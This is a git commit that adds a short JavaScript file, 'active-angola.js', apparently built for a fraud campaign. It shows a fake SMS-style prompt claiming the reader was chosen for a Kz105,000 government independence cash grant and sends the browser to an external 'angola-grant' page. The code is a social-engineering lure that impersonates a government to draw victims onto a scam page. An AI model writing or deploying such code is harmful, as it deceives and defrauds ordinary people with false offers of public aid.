2cff6d2c3004f160216d815ab68a31f7292f878f
itidnewblog4 <ukpehaitid2@gmail.com>
2025-11-04 08:56:05 +0100

    Create active-angola.js

---
+++ active-angola.js
@@ -0,0 +1,5 @@
+var password = 'WITHDRAW Kz105,000'
+password=prompt('SMS: Happy Independence, you are among the selected ones to receive Kz105,000 cash grant from the government, Press Ok to withdraw cash Now ','WITHDRAW Kz105,000');
+if (password != 'WITHDRAW Kz105,000') {
+location.href='https://phlug.org/angola-grant.html';
+}
